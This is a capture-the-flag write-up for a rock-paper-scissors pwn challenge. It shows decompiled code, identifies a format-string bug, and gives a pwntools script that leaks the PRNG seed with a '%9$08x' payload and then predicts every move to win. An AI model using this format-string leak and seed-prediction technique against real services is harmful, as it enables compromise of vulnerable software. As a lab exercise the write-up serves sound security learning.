---
layout: post
date: 2023-09-25 12:00:00 +0200
title: "Rock-Paper-Scissors"
excerpt_separator: <!--more-->
---

# Rock-Paper-Scissors

In this challenge, we are given a rock-paper-scissors binary and must win 50 times in a row to get the flag.

## Disassembly and analysis

First, let's analyze this game with ghidra. The main function consists at its core of the following :

```
fd = open("/dev/urandom",0);
if (fd < 0) {
  printf("Opening /dev/urandom failed");
  exit(1);
}
read(fd,&seed,4);
close(fd);
srand(seed);
printf("Enter your name: ");
fgets(name,0x14,stdin);
printf("Hi ");
printf(name);
puts("Let\'s play some Rock Paper Scissors!");
puts("If you beat me 50 times in a row I\'ll give you a special prize.");
for (i = 0; i < 0x32; i = i + 1) {
  res = rps();
  if (res != '\x01') {
    puts("You didn\'t beat me enough times. Too bad!");
    exit(1);
  }
}
win();
```

The vulnerability is immediatly identified as a format string. We could try to rewrite the return address of rps to redirect to win, but a quick checksec shows us its not going to be easy because this binary is position-independent :
```
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```
Moreover, the buffer for `name` is only 20 bytes long so we need to find an efficient payload. Lets look at the `rps` function :
```
undefined8 rps(void)
{
  int r;
  undefined8 uVar1;
  long in_FS_OFFSET;
  char user_choice;
  char rand_choice;
  int local_18;
  undefined2 rp;
  undefined s;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  user_choice = '\0';
  rp = 0x7072;
  s = 0x73;
  r = rand();
  rand_choice = *(char *)((long)&rp + (long)(r % 3));
  puts("Let\'s play!");
  do {
    if (((user_choice == 'r') || (user_choice == 'p')) || (user_choice == 's')) {
      if ((((user_choice == 'r') && (rand_choice == 's')) ||
          ((user_choice == 'p' && (rand_choice == 'r')))) ||
         ((user_choice == 's' && (rand_choice == 'p')))) {
        puts("You win!");
        uVar1 = 1;
      }
      else {
        puts("You lost.");
        uVar1 = 0;
      }
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return uVar1;
    }
    printf("Enter your choice (r/p/s): ");
    __isoc99_scanf(&DAT_0010203b,&user_choice);
    do {
      local_18 = getchar();
      if (local_18 == 10) break;
    } while (local_18 != -1);
  } while( true );
}
```

The interesting part is the random choice selection : basically, we could rewrite it
```
rps = "rps";
r = rand();
rand_choice = rps[r%3];
```

## Pseudorandom number generators

In C, the `rand` function produces pseudo-random outputs from a chosen value called seed. The pseudorandom generator is initialized by calling the function `srand` at the beginning of function `main`, and the seed is chosen by reading `/dev/urandom` which produces pseudorandom numbers on linux devices. If we could somehow know the seed, we could then predict the entire rock-paper-scissors sequence. Let's use the format string vulnerability for this !

## Exploiting the format string bug

We find that the seed can be accessed as the 9th word on the stack when calling `printf(name)`. We then automate the winning process using pwntools et voilà !

```
from ctypes import CDLL
from pwn import *

conn = remote('vsc.tf', 3094)

print(conn.recvuntil(b": "))
conn.sendline(b'%9$08x')
seed = int(str(conn.recvline()[3:-1])[2:-1], base=16)

print(conn.recvline())
print(conn.recvline())

libc = CDLL("libc.so.6")
libc.srand(seed)

choices = "rps"

for i in range(50):
    print(conn.recvline())
    print(conn.recvuntil(b': '))
    r = choices[libc.rand()%3]
    if r == 'r':
        conn.sendline(b'p')
    elif r == 'p':
        conn.sendline(b's')
    else:
        conn.sendline(b'r')
    print(conn.recvline())

print(conn.recv())
```

The result is
```
[micronoyau@pwnixos:~/Documents/vsctf/RPS]$ python res.py 
[+] Opening connection to vsc.tf on port 3094: Done
b'Enter your name: '
b"Let's play some Rock Paper Scissors!\n"
b"If you beat me 50 times in a row I'll give you a special prize.\n"
b"Let's play!\n"
b'Enter your choice (r/p/s): '
b'You win!\n'
b"Let's play!\n"
b'Enter your choice (r/p/s): '
b'You win!\n'
[...]
b"Let's play!\n"
b'Enter your choice (r/p/s): '
b'You win!\n'
b'vsctf{Wh4t_da_h3ck_br0_gu355_g0d_kn0ws_4ll_my_m0v3s_:(((}\n\n'
[*] Closed connection to vsc.tf port 3094
```
Got the flag :)
